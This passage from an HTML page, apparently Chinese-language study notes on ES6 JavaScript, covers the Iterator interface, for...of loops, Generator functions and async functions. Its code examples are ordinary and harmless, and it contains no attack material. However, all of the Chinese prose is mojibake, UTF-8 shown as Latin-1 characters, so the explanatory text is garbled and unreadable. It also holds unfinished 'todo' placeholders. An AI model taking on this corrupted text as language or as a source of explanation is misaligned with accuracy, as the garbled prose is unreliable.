æ¥å£çš„ç›®çš„ï¼Œå°±æ˜¯ä¸ºæ‰€æœ‰æ•°æ®ç»“æ„ï¼Œæä¾›äº†ä¸€ç§ç»Ÿä¸€çš„è®¿é—®æœºåˆ¶ï¼Œå³<code>for...of</code>å¾ªç¯ã€‚å½“ä½¿ç”¨<code>for...of</code>å¾ªç¯éå†æŸç§æ•°æ®ç»“æ„æ—¶ï¼Œè¯¥å¾ªç¯ä¼šè‡ªåŠ¨å»å¯»æ‰¾ Iterator æ¥å£ã€‚</p><p>ä¸€ç§æ•°æ®ç»“æ„åªè¦éƒ¨ç½²äº† Iterator æ¥å£ï¼Œæˆ‘ä»¬å°±ç§°è¿™ç§æ•°æ®ç»“æ„æ˜¯â€œå¯éå†çš„â€ã€‚åŸç”Ÿå…·å¤‡ Iterator æ¥å£çš„æ•°æ®ç»“æ„å¦‚ä¸‹ã€‚</p><ul><li>Array</li><li>Map</li><li>Set</li><li>String</li><li>TypedArray</li><li>å‡½æ•°çš„ arguments å¯¹è±¡</li><li>NodeList å¯¹è±¡</li></ul><h2 id="3ã€è°ƒç”¨-Iterator-æ¥å£çš„åœºåˆ"><a href="#3ã€è°ƒç”¨-Iterator-æ¥å£çš„åœºåˆ" class="headerlink" title="3ã€è°ƒç”¨ Iterator æ¥å£çš„åœºåˆ"></a>3ã€è°ƒç”¨ Iterator æ¥å£çš„åœºåˆ</h2><p><strong>ï¼ˆ1ï¼‰è§£æ„èµ‹å€¼</strong></p><p>å¯¹æ•°ç»„å’Œ Set ç»“æ„è¿›è¡Œè§£æ„èµ‹å€¼æ—¶ï¼Œä¼šé»˜è®¤è°ƒç”¨<code>Symbol.iterator</code>æ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>().add(<span class="string">&#x27;a&#x27;</span>).add(<span class="string">&#x27;b&#x27;</span>).add(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x,y] = set;</span><br><span class="line"><span class="comment">// x=&#x27;a&#x27;; y=&#x27;b&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [first, ...rest] = set;</span><br><span class="line"><span class="comment">// first=&#x27;a&#x27;; rest=[&#x27;b&#x27;,&#x27;c&#x27;];</span></span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰æ‰©å±•è¿ç®—ç¬¦</strong></p><p>æ‰©å±•è¿ç®—ç¬¦ï¼ˆâ€¦ï¼‰ä¹Ÿä¼šè°ƒç”¨é»˜è®¤çš„ Iterator æ¥å£ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¾‹ä¸€</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">[...str] <span class="comment">//  [&#x27;h&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¾‹äºŒ</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, ...arr, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;]</span></span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œè¿™æä¾›äº†ä¸€ç§ç®€ä¾¿æœºåˆ¶ï¼Œå¯ä»¥å°†ä»»ä½•éƒ¨ç½²äº† Iterator æ¥å£çš„æ•°æ®ç»“æ„ï¼Œè½¬ä¸ºæ•°ç»„ã€‚</p><p><strong>ï¼ˆ3ï¼‰yield*</strong></p><p><code>yield*</code>åé¢è·Ÿçš„æ˜¯ä¸€ä¸ªå¯éå†çš„ç»“æ„ï¼Œå®ƒä¼šè°ƒç”¨è¯¥ç»“æ„çš„éå†å™¨æ¥å£ã€‚</p><p><strong>ï¼ˆ4ï¼‰å…¶ä»–åœºåˆ</strong></p><p>ç”±äºæ•°ç»„çš„éå†ä¼šè°ƒç”¨éå†å™¨æ¥å£ï¼Œæ‰€ä»¥ä»»ä½•æ¥å—æ•°ç»„ä½œä¸ºå‚æ•°çš„åœºåˆï¼Œå…¶å®éƒ½è°ƒç”¨äº†éå†å™¨æ¥å£ã€‚ä¸‹é¢æ˜¯ä¸€äº›ä¾‹å­ã€‚</p><ul><li>forâ€¦of</li><li>Array.from()</li><li>Map(), Set(), WeakMap(), WeakSet()ï¼ˆæ¯”å¦‚<code>new Map([[&#39;a&#39;,1],[&#39;b&#39;,2]])</code>ï¼‰</li><li>Promise.all()</li><li>Promise.race()</li></ul><h2 id="4ã€å­—ç¬¦ä¸²çš„-Iterator-æ¥å£"><a href="#4ã€å­—ç¬¦ä¸²çš„-Iterator-æ¥å£" class="headerlink" title="4ã€å­—ç¬¦ä¸²çš„ Iterator æ¥å£"></a>4ã€å­—ç¬¦ä¸²çš„ Iterator æ¥å£</h2><p>å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œä¹ŸåŸç”Ÿå…·æœ‰ Iterator æ¥å£ã€‚</p><h2 id="5ã€forâ€¦of-å¾ªç¯"><a href="#5ã€forâ€¦of-å¾ªç¯" class="headerlink" title="5ã€forâ€¦of å¾ªç¯"></a>5ã€forâ€¦of å¾ªç¯</h2><p><code>for...of</code>å¾ªç¯å†…éƒ¨è°ƒç”¨çš„æ˜¯æ•°æ®ç»“æ„çš„<code>Symbol.iterator</code>æ–¹æ³•ã€‚<code>for...of</code>å¾ªç¯å¯ä»¥ä½¿ç”¨çš„èŒƒå›´åŒ…æ‹¬æ•°ç»„ã€Set å’Œ Map ç»“æ„ã€æŸäº›ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼ˆæ¯”å¦‚<code>arguments</code>å¯¹è±¡ã€DOM NodeList å¯¹è±¡ï¼‰ã€Generator å¯¹è±¡ï¼Œä»¥åŠå­—ç¬¦ä¸²ã€‚</p><h3 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> arr) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(v); <span class="comment">// red green blue</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JavaScript åŸæœ‰çš„<code>for...in</code>å¾ªç¯ï¼Œåªèƒ½è·å¾—å¯¹è±¡çš„é”®åï¼Œä¸èƒ½ç›´æ¥è·å–é”®å€¼ã€‚ES6 æä¾›<code>for...of</code>å¾ªç¯ï¼Œå…è®¸éå†è·å¾—é”®å€¼ã€‚</p><h3 id="Set-å’Œ-Map-ç»“æ„"><a href="#Set-å’Œ-Map-ç»“æ„" class="headerlink" title="Set å’Œ Map ç»“æ„"></a>Set å’Œ Map ç»“æ„</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> engines = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&quot;Gecko&quot;</span>, <span class="string">&quot;Trident&quot;</span>, <span class="string">&quot;Webkit&quot;</span>, <span class="string">&quot;Webkit&quot;</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> e <span class="keyword">of</span> engines) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Gecko</span></span><br><span class="line"><span class="comment">// Trident</span></span><br><span class="line"><span class="comment">// Webkit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> es6 = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">es6.set(<span class="string">&quot;edition&quot;</span>, <span class="number">6</span>);</span><br><span class="line">es6.set(<span class="string">&quot;committee&quot;</span>, <span class="string">&quot;TC39&quot;</span>);</span><br><span class="line">es6.set(<span class="string">&quot;standard&quot;</span>, <span class="string">&quot;ECMA-262&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> [name, value] <span class="keyword">of</span> es6) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(name + <span class="string">&quot;: &quot;</span> + value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// edition: 6</span></span><br><span class="line"><span class="comment">// committee: TC39</span></span><br><span class="line"><span class="comment">// standard: ECMA-262</span></span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„åœ°æ–¹æœ‰ä¸¤ä¸ªï¼Œé¦–å…ˆï¼Œéå†çš„é¡ºåºæ˜¯æŒ‰ç…§å„ä¸ªæˆå‘˜è¢«æ·»åŠ è¿›æ•°æ®ç»“æ„çš„é¡ºåºã€‚å…¶æ¬¡ï¼ŒSet ç»“æ„éå†æ—¶ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªå€¼ï¼Œè€Œ Map ç»“æ„éå†æ—¶ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ª<strong>æ•°ç»„</strong>ï¼Œè¯¥æ•°ç»„çš„ä¸¤ä¸ªæˆå‘˜åˆ†åˆ«ä¸ºå½“å‰ Map æˆå‘˜çš„é”®åå’Œé”®å€¼ã€‚</p><h3 id="è®¡ç®—ç”Ÿæˆçš„æ•°æ®ç»“æ„"><a href="#è®¡ç®—ç”Ÿæˆçš„æ•°æ®ç»“æ„" class="headerlink" title="è®¡ç®—ç”Ÿæˆçš„æ•°æ®ç»“æ„"></a>è®¡ç®—ç”Ÿæˆçš„æ•°æ®ç»“æ„</h3><p>ES6 çš„æ•°ç»„ã€Setã€Map éƒ½éƒ¨ç½²äº†ä»¥ä¸‹ä¸‰ä¸ªæ–¹æ³•ï¼Œè°ƒç”¨åéƒ½è¿”å›éå†å™¨å¯¹è±¡ã€‚</p><ul><li><code>entries()</code> è¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œç”¨æ¥éå†<code>[é”®å, é”®å€¼]</code>ç»„æˆçš„æ•°ç»„ã€‚å¯¹äºæ•°ç»„ï¼Œé”®åå°±æ˜¯ç´¢å¼•å€¼ï¼›å¯¹äº Setï¼Œé”®åä¸é”®å€¼ç›¸åŒã€‚Map ç»“æ„çš„ Iterator æ¥å£ï¼Œé»˜è®¤å°±æ˜¯è°ƒç”¨<code>entries</code>æ–¹æ³•ã€‚</li><li><code>keys()</code> è¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œç”¨æ¥éå†æ‰€æœ‰çš„é”®åã€‚</li><li><code>values()</code> è¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œç”¨æ¥éå†æ‰€æœ‰çš„é”®å€¼ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> pair <span class="keyword">of</span> arr.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(pair);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [0, &#x27;a&#x27;]</span></span><br><span class="line"><span class="comment">// [1, &#x27;b&#x27;]</span></span><br><span class="line"><span class="comment">// [2, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡"><a href="#ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡" class="headerlink" title="ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡"></a>ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡</h3><p>ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡åŒ…æ‹¬å¥½å‡ ç±»ã€‚ä¸‹é¢æ˜¯<code>for...of</code>å¾ªç¯ç”¨äºå­—ç¬¦ä¸²ã€DOM NodeList å¯¹è±¡ã€<code>arguments</code>å¯¹è±¡çš„ä¾‹å­ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> s <span class="keyword">of</span> str) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s); <span class="comment">// h e l l o</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DOM NodeListå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> paras = <span class="built_in">document</span>.querySelectorAll(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> p <span class="keyword">of</span> paras) &#123;</span><br><span class="line">  p.classList.add(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// argumentså¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printArgs</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> x <span class="keyword">of</span> <span class="built_in">arguments</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">printArgs(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="comment">// &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">// &#x27;b&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="å¯¹è±¡"><a href="#å¯¹è±¡" class="headerlink" title="å¯¹è±¡"></a>å¯¹è±¡</h3><p>å¯¹äºæ™®é€šçš„å¯¹è±¡ï¼Œ<code>for...of</code>ç»“æ„ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œä¼šæŠ¥é”™ï¼Œå¿…é¡»éƒ¨ç½²äº† Iterator æ¥å£åæ‰èƒ½ä½¿ç”¨ã€‚</p><p>ä¸€ç§è§£å†³æ–¹æ³•æ˜¯ï¼Œä½¿ç”¨<code>Object.keys</code>æ–¹æ³•å°†å¯¹è±¡çš„é”®åç”Ÿæˆä¸€ä¸ªæ•°ç»„ï¼Œç„¶åéå†è¿™ä¸ªæ•°ç»„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(someObject)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key + <span class="string">&#x27;: &#x27;</span> + someObject[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªæ–¹æ³•æ˜¯ä½¿ç”¨ Generator å‡½æ•°å°†å¯¹è±¡é‡æ–°åŒ…è£…ä¸€ä¸‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">entries</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(obj)) &#123;</span><br><span class="line">    <span class="keyword">yield</span> [key, obj[key]];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> entries(obj)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key, <span class="string">&#x27;-&gt;&#x27;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// a -&gt; 1</span></span><br><span class="line"><span class="comment">// b -&gt; 2</span></span><br><span class="line"><span class="comment">// c -&gt; 3</span></span><br></pre></td></tr></table></figure><h3 id="ä¸å…¶ä»–éå†è¯­æ³•çš„æ¯”è¾ƒ"><a href="#ä¸å…¶ä»–éå†è¯­æ³•çš„æ¯”è¾ƒ" class="headerlink" title="ä¸å…¶ä»–éå†è¯­æ³•çš„æ¯”è¾ƒ"></a>ä¸å…¶ä»–éå†è¯­æ³•çš„æ¯”è¾ƒ</h3><ul><li><code>forEach</code>æ–¹æ³•é—®é¢˜åœ¨äºï¼Œæ— æ³•ä¸­é€”è·³å‡ºå¾ªç¯ï¼Œ<code>break</code>å‘½ä»¤æˆ–<code>return</code>å‘½ä»¤éƒ½ä¸èƒ½å¥æ•ˆã€‚</li><li><code>for...in</code>å¾ªç¯æœ‰å‡ ä¸ªç¼ºç‚¹ï¼š<ul><li>æ•°ç»„çš„é”®åæ˜¯æ•°å­—ï¼Œä½†æ˜¯<code>for...in</code>å¾ªç¯æ˜¯ä»¥å­—ç¬¦ä¸²ä½œä¸ºé”®åâ€œ0â€ã€â€œ1â€ã€â€œ2â€ç­‰ç­‰ã€‚</li><li><code>for...in</code>å¾ªç¯ä¸ä»…éå†æ•°å­—é”®åï¼Œè¿˜ä¼šéå†æ‰‹åŠ¨æ·»åŠ çš„å…¶ä»–é”®ï¼Œç”šè‡³åŒ…æ‹¬åŸå‹é“¾ä¸Šçš„é”®ã€‚</li><li>æŸäº›æƒ…å†µä¸‹ï¼Œ<code>for...in</code>å¾ªç¯ä¼šä»¥ä»»æ„é¡ºåºéå†é”®åã€‚</li></ul></li><li><code>for...of</code>å¾ªç¯ç›¸æ¯”ä¸Šé¢å‡ ç§åšæ³•ï¼Œæœ‰ä¸€äº›æ˜¾è‘—çš„ä¼˜ç‚¹ï¼š<ul><li>æœ‰ç€åŒ<code>for...in</code>ä¸€æ ·çš„ç®€æ´è¯­æ³•ï¼Œä½†æ˜¯æ²¡æœ‰<code>for...in</code>é‚£äº›ç¼ºç‚¹ã€‚</li><li>ä¸åŒäº<code>forEach</code>æ–¹æ³•ï¼Œå®ƒå¯ä»¥ä¸<code>break</code>ã€<code>continue</code>å’Œ<code>return</code>é…åˆä½¿ç”¨ã€‚</li><li>æä¾›äº†éå†æ‰€æœ‰æ•°æ®ç»“æ„çš„ç»Ÿä¸€æ“ä½œæ¥å£ã€‚</li></ul></li></ul><h1 id="Generator-å‡½æ•°çš„è¯­æ³•"><a href="#Generator-å‡½æ•°çš„è¯­æ³•" class="headerlink" title="Generator å‡½æ•°çš„è¯­æ³•"></a>Generator å‡½æ•°çš„è¯­æ³•</h1><h2 id="1ã€ç®€ä»‹"><a href="#1ã€ç®€ä»‹" class="headerlink" title="1ã€ç®€ä»‹"></a>1ã€ç®€ä»‹</h2><h3 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h3><p>Generator å‡½æ•°æ˜¯ ES6 æä¾›çš„ä¸€ç§å¼‚æ­¥ç¼–ç¨‹è§£å†³æ–¹æ¡ˆï¼ŒGenerator å‡½æ•°æœ‰å¤šç§ç†è§£è§’åº¦ï¼š</p><ul><li>è¯­æ³•ä¸Šï¼Œé¦–å…ˆå¯ä»¥æŠŠå®ƒç†è§£æˆï¼ŒGenerator å‡½æ•°æ˜¯ä¸€ä¸ªçŠ¶æ€æœºï¼Œå°è£…äº†å¤šä¸ªå†…éƒ¨çŠ¶æ€ã€‚æ‰§è¡Œ Generator å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒGenerator å‡½æ•°é™¤äº†çŠ¶æ€æœºï¼Œè¿˜æ˜¯ä¸€ä¸ªéå†å™¨å¯¹è±¡ç”Ÿæˆå‡½æ•°ã€‚è¿”å›çš„éå†å™¨å¯¹è±¡ï¼Œå¯ä»¥ä¾æ¬¡éå† Generator å‡½æ•°å†…éƒ¨çš„æ¯ä¸€ä¸ªçŠ¶æ€ã€‚</li><li>å½¢å¼ä¸Šï¼ŒGenerator å‡½æ•°æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œä½†æ˜¯æœ‰ä¸¤ä¸ªç‰¹å¾ã€‚ä¸€æ˜¯ï¼Œ<code>function</code>å…³é”®å­—ä¸å‡½æ•°åä¹‹é—´æœ‰ä¸€ä¸ªæ˜Ÿå·ï¼›äºŒæ˜¯ï¼Œå‡½æ•°ä½“å†…éƒ¨ä½¿ç”¨<code>yield</code>è¡¨è¾¾å¼ï¼Œå®šä¹‰ä¸åŒçš„å†…éƒ¨çŠ¶æ€ï¼ˆ<code>yield</code>åœ¨è‹±è¯­é‡Œçš„æ„æ€å°±æ˜¯â€œäº§å‡ºâ€ï¼‰ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">helloWorldGenerator</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;ending&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hw = helloWorldGenerator();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç å®šä¹‰äº†ä¸€ä¸ª Generator å‡½æ•°<code>helloWorldGenerator</code>ï¼Œå®ƒå†…éƒ¨æœ‰ä¸¤ä¸ª<code>yield</code>è¡¨è¾¾å¼ï¼ˆ<code>hello</code>å’Œ<code>world</code>ï¼‰ï¼Œå³è¯¥å‡½æ•°æœ‰ä¸‰ä¸ªçŠ¶æ€ï¼šhelloï¼Œworld å’Œ return è¯­å¥ï¼ˆç»“æŸæ‰§è¡Œï¼‰ã€‚</p><p>ç„¶åï¼ŒGenerator å‡½æ•°çš„è°ƒç”¨æ–¹æ³•ä¸æ™®é€šå‡½æ•°ä¸€æ ·ï¼Œä¹Ÿæ˜¯åœ¨å‡½æ•°ååé¢åŠ ä¸Šä¸€å¯¹åœ†æ‹¬å·ã€‚ä¸åŒçš„æ˜¯ï¼Œè°ƒç”¨ Generator å‡½æ•°åï¼Œè¯¥å‡½æ•°å¹¶ä¸æ‰§è¡Œï¼Œè¿”å›çš„ä¹Ÿä¸æ˜¯å‡½æ•°è¿è¡Œç»“æœï¼Œè€Œæ˜¯ä¸€ä¸ªæŒ‡å‘å†…éƒ¨çŠ¶æ€çš„æŒ‡é’ˆå¯¹è±¡ï¼ˆéå†å™¨å¯¹è±¡ï¼‰ã€‚</p><p>ä¸‹ä¸€æ­¥ï¼Œå¿…é¡»è°ƒç”¨éå†å™¨å¯¹è±¡çš„<code>next</code>æ–¹æ³•ï¼Œä½¿å¾—æŒ‡é’ˆç§»å‘ä¸‹ä¸€ä¸ªçŠ¶æ€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡è°ƒç”¨<code>next</code>æ–¹æ³•ï¼Œå†…éƒ¨æŒ‡é’ˆå°±ä»å‡½æ•°å¤´éƒ¨æˆ–ä¸Šä¸€æ¬¡åœä¸‹æ¥çš„åœ°æ–¹å¼€å§‹æ‰§è¡Œï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ª<code>yield</code>è¡¨è¾¾å¼ï¼ˆæˆ–<code>return</code>è¯­å¥ï¼‰ä¸ºæ­¢ã€‚æ¢è¨€ä¹‹ï¼ŒGenerator å‡½æ•°æ˜¯åˆ†æ®µæ‰§è¡Œçš„ï¼Œ<code>yield</code>è¡¨è¾¾å¼æ˜¯æš‚åœæ‰§è¡Œçš„æ ‡è®°ï¼Œè€Œ<code>next</code>æ–¹æ³•å¯ä»¥æ¢å¤æ‰§è¡Œã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">hw.next()</span><br><span class="line"><span class="comment">// &#123; value: &#x27;hello&#x27;, done: false &#125;</span></span><br><span class="line"></span><br><span class="line">hw.next()</span><br><span class="line"><span class="comment">// &#123; value: &#x27;world&#x27;, done: false &#125;</span></span><br><span class="line"></span><br><span class="line">hw.next()</span><br><span class="line"><span class="comment">// &#123; value: &#x27;ending&#x27;, done: true &#125;</span></span><br><span class="line"></span><br><span class="line">hw.next()</span><br><span class="line"><span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼Œè°ƒç”¨ Generator å‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œä»£è¡¨ Generator å‡½æ•°çš„å†…éƒ¨æŒ‡é’ˆã€‚ä»¥åï¼Œæ¯æ¬¡è°ƒç”¨éå†å™¨å¯¹è±¡çš„<code>next</code>æ–¹æ³•ï¼Œå°±ä¼šè¿”å›ä¸€ä¸ªæœ‰ç€<code>value</code>å’Œ<code>done</code>ä¸¤ä¸ªå±æ€§çš„å¯¹è±¡ã€‚<code>value</code>å±æ€§è¡¨ç¤ºå½“å‰çš„å†…éƒ¨çŠ¶æ€çš„å€¼ï¼Œæ˜¯<code>yield</code>è¡¨è¾¾å¼åé¢é‚£ä¸ªè¡¨è¾¾å¼çš„å€¼ï¼›<code>done</code>å±æ€§æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦éå†ç»“æŸã€‚</p><p>â€¦ï¼ˆtodoï¼‰</p><h1 id="Generator-å‡½æ•°çš„å¼‚æ­¥åº”ç”¨"><a href="#Generator-å‡½æ•°çš„å¼‚æ­¥åº”ç”¨" class="headerlink" title="Generator å‡½æ•°çš„å¼‚æ­¥åº”ç”¨"></a>Generator å‡½æ•°çš„å¼‚æ­¥åº”ç”¨</h1><p>â€¦ï¼ˆtodoï¼‰</p><h1 id="async-å‡½æ•°"><a href="#async-å‡½æ•°" class="headerlink" title="async å‡½æ•°"></a>async å‡½æ•°</h1><h2 id="1ã€å«ä¹‰"><a href="#1ã€å«ä¹‰" class="headerlink" title="1ã€å«ä¹‰"></a>1ã€å«ä¹‰</h2><p>async å‡½æ•°æ˜¯ Generator å‡½æ•°çš„è¯­æ³•ç³–ã€‚async<code>å‡½æ•°å°±æ˜¯å°† Generator å‡½æ•°çš„æ˜Ÿå·ï¼ˆ</code>*<code>ï¼‰æ›¿æ¢æˆ</code>async<code>ï¼Œå°†</code>yield<code>æ›¿æ¢æˆ</code>awaitã€‚</p><p><code>async</code>å‡½æ•°å¯¹ Generator å‡½æ•°çš„æ”¹è¿›ï¼Œä½“ç°åœ¨ä»¥ä¸‹å››ç‚¹ã€‚</p><p>ï¼ˆ1ï¼‰å†…ç½®æ‰§è¡Œå™¨ã€‚</p><p>Generator å‡½æ•°çš„æ‰§è¡Œå¿…é¡»é æ‰§è¡Œå™¨ï¼Œæ‰€ä»¥æ‰æœ‰äº†<code>co</code>æ¨¡å—ï¼Œè€Œ<code>async</code>å‡½æ•°è‡ªå¸¦æ‰§è¡Œå™¨ã€‚</p><p>ï¼ˆ2ï¼‰æ›´å¥½çš„è¯­ä¹‰ã€‚</p><p><code>async</code>å’Œ<code>await</code>ï¼Œæ¯”èµ·æ˜Ÿå·å’Œ<code>yield</code>ï¼Œè¯­ä¹‰æ›´æ¸…æ¥šäº†ã€‚<code>async</code>è¡¨ç¤ºå‡½æ•°é‡Œæœ‰å¼‚æ­¥æ“ä½œï¼Œ<code>await</code>è¡¨ç¤ºç´§è·Ÿåœ¨åé¢çš„è¡¨è¾¾å¼éœ€è¦ç­‰å¾…ç»“æœã€‚</p><p>ï¼ˆ3ï¼‰æ›´å¹¿çš„é€‚ç”¨æ€§ã€‚</p><p><code>co</code>æ¨¡å—çº¦å®šï¼Œ<code>yield</code>å‘½ä»¤åé¢åªèƒ½æ˜¯ Thunk å‡½æ•°æˆ– Promise å¯¹è±¡ï¼Œè€Œ<code>async</code>å‡½æ•°çš„<code>await</code>å‘½ä»¤åé¢ï¼Œå¯ä»¥æ˜¯ Promise å¯¹è±¡å’ŒåŸå§‹ç±»å‹çš„å€¼ï¼ˆæ•°å€¼ã€å­—ç¬¦ä¸²å’Œå¸ƒå°”å€¼ï¼Œä½†è¿™æ—¶ä¼šè‡ªåŠ¨è½¬æˆç«‹å³ resolved çš„ Promise å¯¹è±¡ï¼‰ã€‚</p><p>ï¼ˆ4ï¼‰è¿”å›å€¼æ˜¯ Promiseã€‚</p><p><code>async</code>å‡½æ•°çš„è¿”å›å€¼æ˜¯ Promise å¯¹è±¡ï¼Œè¿™æ¯” Generator å‡½æ•°çš„è¿”å›å€¼æ˜¯ Iterator 